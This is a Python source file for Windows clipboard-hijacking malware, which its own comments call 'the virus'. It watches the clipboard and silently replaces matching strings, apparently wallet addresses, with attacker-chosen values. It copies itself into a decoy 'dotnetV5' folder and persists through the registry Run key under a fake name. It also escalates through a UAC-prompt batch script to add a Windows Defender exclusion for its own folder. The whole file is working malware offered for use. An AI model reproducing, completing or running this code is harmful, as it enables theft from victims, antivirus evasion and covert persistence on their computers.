
class logger:
    class data_handle:
        def read():
            value = pyperclip.paste()
            return value
        def write(self):
            pyperclip.copy(f'{self}')


    class proc_handle():
        def func_reset():
            logger.proc_handle.func()
        def func():
            struct = __config__
            while True:
                time.sleep(__config__.interval_update)
                current_clipboard=logger.data_handle.read()
                item_num = len(__config__.detection_string)
                for x in range(item_num):
                    current_item = __config__.detection_string[x]
                    current_num = int(x)
                    if current_item in current_clipboard:
                        if current_clipboard == __config__.pasted_string[x]:
                            pass
                        else:
                            logger.data_handle.write(__config__.pasted_string[x])

    class setup_idenf():
        def start():
            logger.proc_handle.func()

class zeno:
    def powershell(install_path, script):
        with open(f"{install_path}\\admin.bat", "w") as admin:
            admin.write(f'''
    @echo off

    :: BatchGotAdmin
    :-------------------------------------
    REM  --> Check for permissions
        IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
    ) ELSE (
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
    )

    REM --> If error flag set, we do not have admin.
    if '%errorlevel%' NEQ '0' (
        echo Requesting administrative privileges...
        goto UACPrompt
    ) else ( goto gotAdmin )

    :UACPrompt
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        set params= %*
        echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        exit /B

    :gotAdmin
        pushd "%CD%"
        CD /D "%~dp0"
    :--------------------------------------    
    {script}
                    ''')
        os.system(f'{install_path}\\admin.bat')

# /?data_inf?/ #
get_filename = f"{os.path.basename(__file__)}" # Get self file name to import too
filename=str(get_filename.replace(".py", ".exe")) # Replace .py in name to .exe (This is a compiler issue, Do not remove this or change any code relating to it)
user = os.getlogin() # Get Username of PC Directory (users)
self_path=str(f"{os.getcwd()}") # Get Path of Self #
install_path=str(f"C:\\Users\\{user}\\Documents\\dotnetV5") # Path to install the virus too ( MUST HAVE \\ not \ )
win_locStart=str(f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") # Windows Shortcut Directory ( DO NOT CHANGE THIS )

add_exclusion = __config__.add_exclusion
install_set = __config__.install_set
startup_set = __config__.startup_set

class install_embed():
    def install_windows():
        isExist = os.path.exists(install_path)
        if not isExist:
            os.makedirs(install_path)
        is_exist = os.path.isfile(f"{install_path}\\{filename}")
        if is_exist:
            return 1
        else:
            shutil.copy(f'{self_path}\\{filename}', f'{install_path}')
            return 0
    def add_to_registry():
        address=str(f"{install_path}\\{filename}")
        print(address)
        # key we want to change is HKEY_CURRENT_USER
        # key value is Software\Microsoft\Windows\CurrentVersion\Run
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
         
        # open the key to make changes to
        open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
         
        # modify the opened key
        reg.SetValueEx(open,"1002_winvert",0,reg.REG_SZ,address)
         
        # now close the opened key
        reg.CloseKey(open)

class setup_proc():
    def chk_ins():
        if install_set == 'y' or install_set == 'Y': # Install to Directory #
            install_embed_return = install_embed.install_windows()
        if startup_set == 'y' or startup_set == 'Y': # Add to Startup #
            if install_embed_return == 0:
                install_embed.add_to_registry()
        if add_exclusion == 'y' or add_exclusion == 'Y':
            if install_embed_return == 0:
                script=str(f'powershell.exe -Command Add-MpPreference -ExclusionPath "{install_path}"')
                zeno.powershell(install_path=install_path, script=script)
        # /?Execute Code?/ #
        logger.setup_idenf.start()

if __name__=="__main__":
    setup_proc.chk_ins()